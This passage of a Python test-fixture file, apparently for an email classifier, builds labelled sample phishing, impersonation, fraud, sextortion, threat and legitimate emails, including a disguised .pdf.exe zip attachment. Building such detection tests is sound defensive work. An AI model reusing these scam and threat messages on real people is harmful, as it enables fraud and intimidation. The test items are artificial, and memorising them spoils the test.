)

case(
    "P11_payroll_direct_deposit", PHISH, {PHISH, FRAUD, IMP},
    frm='"Payroll Department" <payroll.acmecorp.update@gmail.com>', client_ip="105.112.33.8", client_host="[105.112.33.8]",
    subject="Payroll: update your salary account before the cut-off",
    text="""Dear employee,

Due to a change in our payroll processor, all employees must re-enter their salary bank account details before the payroll cut-off on Friday. Failure to do so will delay your September salary.

Update here: http://acme-payroll-portal.com/employee/update

Payroll Department
""",
)

case(
    "P12_compromised_vendor_share", PHISH,
    frm='"Arjun Rao" <arjun.rao@bluepeak-solutions.com>', relay="outlook",
    subject="RE: Revised SOW - please review",
    text="""Hi Rohan,

Please review the revised SOW on the secure portal below and sign by EOD, the link expires today.

https://sharepoint-docs-viewer.com/bluepeak/SOW_v3?auth=required

Thanks,
Arjun Rao
Bluepeak Solutions
""",
)

case(
    "P13_qr_kyc_image", PHISH, {PHISH, SUSP},
    frm='"KYC Desk" <kyc.update.desk2026@outlook.com>', relay="outlook", dkim_domain="outlook.com",
    subject="Complete KYC to keep your UPI active",
    text="""Dear user,

Your UPI ID will be blocked by NPCI guidelines unless KYC is completed within 24 hours. Scan the attached QR code with any UPI app to complete KYC instantly.

KYC Desk
""",
    attachments=[("kyc_qr.png", png_bytes(), "image/png")],
)

case(
    "I02_paypal_freemail_reply", IMP, {IMP, PHISH},
    frm='"PayPal Service" <paypal.service.desk2026@gmail.com>', client_ip="102.89.33.71", client_host="[102.89.33.71]",
    subject="Your PayPal account has limitations",
    text="""Dear PayPal customer,

Your account access has been limited because of a login from an unrecognised device.

To lift the limitation, reply to this email with your registered phone number, date of birth and the last 4 digits of the linked card. Our team will verify and restore full access within 24 hours.

PayPal Service Team
""",
)

case(
    "I03_org_lookalike_employee_data", IMP, {IMP, FRAUD, PHISH},
    frm='"Priya Nair" <priya.nair@acme-c0rp.in>', relay="vps", spf="none", dkim="none", dmarc="none", to="hr@acme-corp.in",
    msgid_domain="acme-c0rp.in",
    subject="Employee list for audit",
    text="""Hi,

Please send me the updated list of all employees with their PAN numbers and salary bank account numbers by EOD. The auditors need it today.

Thanks,
Priya
""",
)

case(
    "I04_spoofed_paypal_domain", IMP, {IMP, PHISH},
    frm='"PayPal" <service@paypal.com>', relay="vps", spf="fail", dkim="none", dmarc="fail", dmarc_policy="REJECT",
    msgid_domain="paypal.com",
    subject="Your account has been limited",
    text="""Dear customer,

We noticed unusual activity in your PayPal account and have limited what you can do until you confirm your information.

Log in to resolve the issue: https://www.paypal.com/signin

Thank you,
PayPal
""",
)

case(
    "I05_exec_outlook_task", IMP,
    frm='"Sarthak Srivastava" <sarthak.srivastava.md@outlook.com>', relay="outlook", dkim_domain="outlook.com",
    to="priya.nair@acme-corp.in",
    subject="Quick task",
    text="""Priya, are you free? I need you to handle a task for me quietly, I'm boarding a flight and can't take calls. Reply on this email as soon as you see it.

Sarthak
""",
)

case(
    "I06_microsoft_lookalike_reply", IMP, {IMP, PHISH},
    frm='"Microsoft Account Team" <account-team@micros0ft.com>', relay="vps", spf="none", dkim="none", dmarc="none",
    msgid_domain="micros0ft.com",
    subject="Unusual activity on your Microsoft account",
    text="""We noticed unusual sign-in activity on your Microsoft account. To keep your account secure, reply to this email to confirm your recovery email address and phone number.

Microsoft Account Team
""",
)

case(
    "I07_embedded_address_display_name", IMP,
    frm='"rohan.pandey@acme-corp.in" <randomuser8812@yandex.com>', relay="yandex", dkim_domain="yandex.com",
    to="priya.nair@acme-corp.in",
    subject="New email id",
    text="Hi Priya, this is my new personal email id. Please update your contacts and reply here from now on.\n\nRohan\n",
)

case(
    "F03_sextortion_btc", FRAUD, {FRAUD, THREAT},
    frm='"Andreas" <andreas.k.helper@protonmail.com>', relay="proton", dkim_domain="protonmail.com",
    subject="You have been recorded",
    text="""Hello pervert.

I have installed malware on the adult website you visited and I have a video of you through your webcam, plus your contact list.

Transfer 0.05 BTC to this address within 48 hours: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

If you do not pay I will send the video to all your contacts and family. Do not try to contact the police, I will know.
""",
)

case(
    "F04_inheritance_advance_fee", FRAUD,
    frm='"Barrister John Okoro" <barr.johnokoro.chambers@yahoo.com>', relay="yahoo", dkim_domain="yahoo.com",
    reply_to="johnokoro.legal@gmail.com", client_ip="197.210.85.12", client_host="DESKTOP-K8J2M1",
    subject="Re: Next of kin - urgent and confidential",
    text="""Dear Friend,

I am Barrister John Okoro, personal attorney to late Mr. Pandey, a contractor who died in a plane crash leaving USD 12.5 million in a bank here. Since you share the same surname, I propose to present you as the next of kin so that the funds can be transferred to your account. We share 60/40.

This is strictly confidential. To start, you only need to pay the transfer processing fee of USD 850 to the bank. Reply with your full name, address and phone number.

Barrister John Okoro
""",
)

case(
    "F05_job_registration_fee", FRAUD,
    frm='"Amazon Careers HR" <amazon.careers.hrteam@gmail.com>', client_ip="103.211.14.90", client_host="[103.211.14.90]",
    subject="Congratulations! You are selected - Work from home data entry",
    text="""Dear Candidate,

Congratulations! You have been selected for the Amazon work from home data entry job (earn Rs.25,000 to Rs.40,000 per month, 2 hours daily).

To activate your account, pay the one-time registration fee of Rs.1,500 to UPI ID hrteam.amazon@paytm and reply with the screenshot. Only 12 seats left for this batch.

HR Team
""",
)

case(
    "F06_crypto_investment", FRAUD,
    frm='"CryptoWealth Advisors" <invest@cryptowealth-advisors.biz>', relay="bulk", spf="pass", dkim="none", dmarc="none",
    msgid_domain="cryptowealth-advisors.biz",
    subject="Guaranteed 30% monthly returns - limited slots",
    text="""Dear Investor,

Our AI trading bot delivers guaranteed returns of 30% every month. Minimum deposit only USD 250. Withdraw profit any time.

Limited slots for September. Join now: https://cryptowealth-advisors.biz/join?ref=IN2026

Over 5,000 investors trust us. Don't miss out!
""",
)

case(
    "F07_fake_invoice_zip_exe", FRAUD, {FRAUD, PHISH},
    frm='"Accounts Receivable" <accounts.receivable.dept@gmail.com>', client_ip="41.203.72.15", client_host="[41.203.72.15]",
    to="accounts@acme-corp.in",
    subject="Overdue invoice - immediate payment required",
    text="""Dear Sir/Madam,

Please find attached the overdue invoice for your account. Kindly pay immediately to avoid legal action and late fees.

Accounts Receivable
""",
    attachments=[("Invoice_09_2026.zip", zip_bytes({"Invoice_09_2026.pdf.exe": exe_bytes()}), "application/zip")],
)

case(
    "F08_tech_support_scam", FRAUD, {FRAUD, IMP, PHISH},
    frm='"Microsoft Security Center" <security.center.alerts@outlook.com>', relay="outlook", dkim_domain="outlook.com",
    subject="Your Windows licence has expired - 5 viruses detected",
    text="""Warning! Your Windows licence has expired and your computer is infected with 5 viruses. Your bank details and passwords are at risk.

Call Microsoft certified support immediately on +1-800-555-0142 to renew your licence (USD 99) and remove the viruses. Do not switch off your computer.

Microsoft Security Center
""",
)

case(
    "F09_charity_scam", FRAUD, {FRAUD, SUSP},
    frm='"Flood Relief Fund" <floodrelief.donate2026@gmail.com>', client_ip="103.211.14.90", client_host="[103.211.14.90]",
    subject="Donate today - families need you tonight",
    text="""Dear friend,

Thousands of families in Assam have lost their homes in the floods. Every rupee counts. Donate Rs.500 or more to UPI ID reliefund@ybl before midnight tonight and forward this to 10 friends.

Flood Relief Fund
""",
)

case(
    "F10_loan_processing_fee", FRAUD,
    frm='"QuickCash Loans" <loans@quickcash-finance.online>', relay="bulk", spf="pass", dkim="none", dmarc="none",
    msgid_domain="quickcash-finance.online",
    subject="Pre-approved personal loan of Rs.5,00,000 at 2% interest",
    text="""Congratulations! Your personal loan of Rs.5,00,000 at 2% annual interest is pre-approved with no documents required.

Pay the processing fee of Rs.999 to UPI quickcash@ybl to get disbursal within 24 hours. Offer valid today only.

QuickCash Finance
""",
)

case(
    "F11_romance_visa_fee", FRAUD,
    frm='"Anna" <anna.lovely.heart@yandex.com>', relay="yandex", dkim_domain="yandex.com",
    subject="my love I need your help",
    text="""My love,

I finally got my visa appointment to come and see you, but the agent needs USD 500 for the visa fee and I don't have it. Please send it via Western Union today so I don't lose the appointment. I will pay you back when I arrive.

Forever yours,
Anna
""",
)

case(
    "F12_hr_gift_cards", FRAUD, {FRAUD, IMP},
    frm='"HR Department" <hr.acmecorp.official@gmail.com>', client_ip="105.112.33.8", client_host="[105.112.33.8]",
    to="priya.nair@acme-corp.in",
    subject="Employee rewards - need your help today",
    text="""Hi Priya,

I need you to buy 5 Google Play gift cards of Rs.5,000 each for the employee rewards program today. Scratch the back and send me the codes by reply. Keep this confidential until the announcement.

Thanks,
HR Department
""",
)

case(
    "F13_income_tax_refund", PHISH, {PHISH, FRAUD, IMP},
    frm='"Income Tax Department" <refund@incometax-india-refunds.com>', relay="bulk", spf="none", dkim="none", dmarc="none",
    msgid_domain="incometax-india-refunds.com",
    subject="You are eligible for an income tax refund of Rs.24,500",
    text="""Dear Taxpayer,

After the final calculation of your fiscal activity we have determined that you are eligible to receive a tax refund of Rs.24,500.

Submit your bank account details within 48 hours to receive the refund: https://incometax-india-refunds.com/refund?pan=

Income Tax Department, Government of India
""",
)

case(
    "T01_hinglish_money_kill", THREAT, {THREAT, FRAUD},
    frm="mousamjha2006@gmail.com", to="sarthaksrivastava525@gmail.com",
    subject="",
    html="""<div dir="auto">Haram khor paise de de<div dir="auto"><br></div><div dir="auto">Give me my money back otherwise I will kill you</div><div dir="auto"><br></div><div dir="auto">Give me fucking 50000 dollar u duffer</div><div dir="auto"><br></div><div dir="auto"><br></div><div dir="auto">Pray for u r life</div></div>""",
)

case(
    "T02_english_extortion", THREAT, {THREAT, FRAUD},
    frm="darkwolf4491@protonmail.com", relay="proton", dkim_domain="protonmail.com",
    subject="last warning",
    text="""Pay me 2,00,000 rupees by Friday or I will leak your private photos to everyone you know. I know where your family lives. Don't test me. Send it to 9876xxxxxx@paytm.
""",
)

case(
    "T03_ransom_data_leak", THREAT, {THREAT, FRAUD},
    frm="lockbit.support.desk@tutanota.com", relay="vps", spf="none", dkim="none", dmarc="none", to="admin@acme-corp.in",
    subject="Acme Corp - your data",
    text="""Hello Acme Corp.

We have downloaded 300 GB of your internal data (HR records, contracts, customer database). Pay 2 BTC within 72 hours or we publish everything on our blog and notify your customers and the press.

Contact us on Tox: 9F3A21C7... Do not involve the police or the price doubles.
""",
)

case(
    "T04_blackmail_upi", THREAT, {THREAT, FRAUD},
    frm="unknown.guy.2299@gmail.com", client_ip="103.211.14.90", client_host="[103.211.14.90]",
    subject="I have your videos",
    text="""I have your videos. Send 20000 rs to 98xxxxxx12@paytm in 24 hours or I send them to all your contacts and your family. This is not a joke.
""",
)

case(
    "T05_violent_threat_no_money", THREAT, {THREAT, SUSP},
    frm="ghost.rider.9911@yahoo.com", relay="yahoo", dkim_domain="yahoo.com",
    subject="",
    text="I will find you and kill you. Watch your back when you leave office. You will pay for what you did to my brother.\n",
)

case(
    "T06_hindi_threat", THREAT, {THREAT, FRAUD},
    frm="rajkumar.singh.8877@gmail.com",
    subject="पैसे वापस दो",
    text="पैसे वापस दो नहीं तो जान से मार दूंगा। तुम्हें और तुम्हारे परिवार को छोड़ूंगा नहीं। कल तक 50000 रुपये भेजो वरना अंजाम बुरा होगा।\n",
)

case(
    "T07_bomb_hoax", THREAT, {THREAT, FRAUD},
    frm="anonymous.justice.44@proton.me", relay="proton", dkim_domain="proton.me", to="admin@acme-corp.in",
    subject="bomb",
    text="There is a bomb planted in your office building. It will go off at 3 PM unless 5 lakh is transferred to the bitcoin address below. bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\n",
)

case(
    "T08_stalking_harassment", THREAT, {THREAT, SUSP},
    frm="watcher.2026.x@outlook.com", relay="outlook", dkim_domain="outlook.com",
    subject="I am watching you",
    text="I am watching you. I saw you leaving office at 6 today in the blue kurta. Reply to me or you will regret it. I know your address.\n",
)

case(
    "S01_followers_spam", SUSP,
    frm='"GrowFast Social" <promo@growfast-social.top>', relay="bulk", spf="none", dkim="none", dmarc="none",
    msgid_domain="growfast-social.top",
    subject="Increase your followers by 10x guaranteed",
    text="""Grow your Instagram organically with our proven method. 10,000 real followers in 30 days or your money back. Trusted by 5,000+ influencers. Limited slots for September. DM or reply to this email.
""",
)

case(
    "S02_unknown_zip_documents", SUSP, {SUSP, LEGIT},
    frm='"Ravi" <ravi.docs.2026@gmail.com>', client_ip="103.87.140.22", client_host="[103.87.140.22]",
    subject="documents",
    text="Hi, please see attached documents.\n",
    attachments=[("documents.zip", zip_bytes({"scan.pdf": pdf_bytes("scan")}), "application/zip")],
)

case(
    "S03_cold_sales_demo", LEGIT, {LEGIT, SUSP},
    frm='"Nikhil from LeadGenPro" <nikhil@leadgenpro.io>', relay="ses", dkim_domain="leadgenpro.io",
    subject="Rohan, quick question about Acme's SOC hiring",
    html="""<html><body><p>Hi Rohan,</p><p>I noticed Acme Corp is hiring SOC analysts. Teams like yours use LeadGenPro to cut alert triage time by 40%.</p>
<p>Worth a 15-minute demo next week? <a href="https://calendly.com/nikhil-leadgenpro/15min">Book a slot</a></p>
<p>Nikhil Bansal<br>LeadGenPro</p><img src="https://track.leadgenpro.io/open?id=9f2a1b" width="1" height="1"></body></html>""",
    extra_headers={"List-Unsubscribe": "<https://leadgenpro.io/unsubscribe?id=9f2a1b>"},
)

case(
    "S04_hackculture_marketing", LEGIT, {LEGIT, SUSP},
    frm='"Manvendra from HackCulture" <manvendra@hackculture.net>', relay="sendgrid", dkim_domain="hackculture.net",
    return_path="bounces+9f2a1b-rohan=acme-corp.in@em.hackculture.net",
    subject="3 days left - your TrackShift 2026 spot is still open.",
    html="""<html><body><p>Hey Rohan,</p><p>Just 3 days left to grab your spot at TrackShift 2026, our 48-hour hackathon on 20-21 September. 500+ builders, Rs.2 lakh in prizes, and mentors from top startups.</p>
<p><a href="https://hackculture.net/trackshift-2026?utm_source=sendgrid">Register now</a> - registrations close Friday.</p>
<p>See you there,<br>Manvendra<br>HackCulture</p>
<p style="font-size:10px"><a href="https://hackculture.net/unsubscribe?u=9f2a1b">Unsubscribe</a></p></body></html>""",
    extra_headers={"List-Unsubscribe": "<https://hackculture.net/unsubscribe?u=9f2a1b>"},
)

REAL = {
    "L01_github_receipt": ("legit_transactional.eml", LEGIT, {LEGIT}),
    "P01_sbi_kyc": ("phishing_sbi_kyc.eml", PHISH, {PHISH}),
    "I01_ceo_gift_cards": ("impersonation_ceo_gift_cards.eml", IMP, {IMP}),
    "F01_lottery": ("fraud_lottery_advance_fee.eml", FRAUD, {FRAUD}),
    "F02_bec_payment_diversion": ("bec_payment_diversion.eml", FRAUD, {FRAUD}),
}


def build_all() -> list[tuple[str, bytes, str, list[str]]]:
    rows: list[tuple[str, bytes, str, list[str]]] = []
    for name, (src, expect, ok) in REAL.items():
        rows.append((name, (SAMPLES / src).read_bytes(), expect, sorted(ok)))
    for item in CASES:
        rows.append((item["name"], build(**item["kw"]), item["expect"], item["ok"]))
    return sorted(rows)
